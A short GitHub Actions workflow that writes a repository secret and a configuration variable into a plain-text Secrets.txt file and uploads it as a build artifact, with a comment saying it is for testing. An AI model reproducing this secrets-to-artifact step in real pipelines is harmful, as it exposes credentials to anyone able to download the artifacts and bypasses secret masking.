name: CI
on:
  workflow_call:
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
        with:
          repository: aneeshchackov/master
      - name: Prepare Secrets.txt
        env:
          ONE: ${{ secrets.ONE }}
          TWO: ${{ vars.TWO }}
        run: |
          $outputFile = "Secrets.txt"
          ${{ secrets.ONE }} | Out-File -FilePath $outputFile -Append #fOR testinga
          ${{ vars.TWO }} | Out-File -FilePath $outputFile -Append #fOR testinga
      - name: Upload a Build Artifact
        uses: actions/upload-artifact@v3.1.3
        with:
          path: |
            README.md 
            HELP.md
            Secrets.txt
          if-no-files-found: error
          retention-days: 0
